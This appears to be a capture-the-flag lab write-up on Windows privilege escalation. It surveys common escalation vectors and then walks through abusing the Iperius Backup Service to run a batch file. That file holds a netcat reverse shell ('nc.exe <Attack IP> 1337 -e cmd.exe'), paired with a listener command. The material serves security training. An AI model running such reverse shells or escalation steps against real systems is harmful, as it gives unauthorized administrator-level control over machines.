# They Lost The Plan!
### Story
McSkidy has realized that she worked on a rough draft of a disaster recovery plan but locked down the permissions on the file to ensure that it was safe. However, the Grinch accessed the local system and reduced the permissions of her account. Can you elevate her privileges and get the file back?

### Learning Objectives
-   Understanding different types of user privileges in Windows  
    
-   Different privilege escalation techniques  
    
-   Exploiting a privilege escalation vulnerability


### Privileges
On a typical Windows server, you may find serveral different account types:
- Domain Administrators
- Services
- Domain users
- Local accounts

### Windows Privilege Escalation Vectors
-   Stored Credentials: Important credentials can be saved in files by the user or in the configuration file of an application installed on the target system.
-   Windows Kernel Exploit: The Windows operating system installed on the target system can have a known vulnerability that can be exploited to increase privilege levels.
-   Insecure File/Folder Permissions: In some situations, even a low privileged user can have read or write privileges over files and folders that can contain sensitive information.
-   Insecure Service Permissions: Similar to permissions over sensitive files and folders, low privileged users may have rights over services. These can be somewhat harmless such as querying the service status (SERVICE_QUERY_STATUS) or more interesting rights such as starting and stopping a service (SERVICE_START and SERVICE_STOP, respectively).
-   DLL Hijacking: Applications use DLL files to support their execution. You can think of these as smaller applications that can be launched by the main application. Sometimes DLLs that are deleted or not present on the system are called by the application. This error doesn't always result in a failure of the application, and the application can still run. Finding a DLL the application is looking for in a location we can write to can help us create a malicious DLL file that will be run by the application. In such a case, the malicious DLL will run with the main application's privilege level. If the application has a higher privilege level than our current user, this could allow us to launch a shell with a higher privilege level.
-   Unquoted Service Path: If the executable path of a service contains a space and is not enclosed within quotes, a hacker could introduce their own malicious executables to run instead of the intended executable.
-   Always Install Elevated: Windows applications can be installed using Windows Installer (also known as MSI packages) files. These files make the installation process easy and straightforward. Windows systems can be configured with the "AlwaysInstallElevated" policy. This allows the installation process to run with administrator privileges without requiring the user to have these privileges. This feature allows users to install software that may need higher privileges without having this privilege level. If "AlwaysInstallElevated" is configured, a malicious executable packaged as an MSI file could be run to obtain a higher privilege level.
-   Other software: Software, applications, or scripts installed on the target machine may also provide privilege escalation vectors.

### Initial Info Gathering
A few key points for enumeration:
- The 	`net users` command will list users on the system 
- The 	`systeminfo | findstr /B /C: "OS Name"/C: "OS Version"` will output info about the operating system.
- Installed services: the `wmic service list` will list services installed on the system

### Exploitation
The Iperius Backup Service suffers from a privilege escalation vulnerability. When it's installed as a service, it can be configured to run backup tasks with administrator level privileges even if the current user has a lower privilege level.

Exploitation steps:
1. Create a new backup task. Can set the path as `C:\Users\McSkidy\Documents`
2. Set the destination (not important): `C:\Users\McSkidy\Desktop`
3. Other processes: Gives us the option to set a program to run before or after every backup process. As the backup process is run with admin level privileges, any program or external file configured here will run with admin level privileges. To exploit this, create a simple `.bat` file and set it to run before the backup.

The .bat file will launch a shell using the nc.exe (netcat utility)

```scheme
	@echo off
	C:\Users\McSkidy\Downloads\nc.exe <Attack IP> 1337 -e cmd.exe
```

4. Launch a listener: The evil.bat file will launch cmd.exe and connect back to our attacking machine on port 1337. We can use `nc` on the attacking machine to listen using `nc -lvnp 1337`
5. Run as service: Right click on the "document" backup job previously created and select "Run backup as service" option.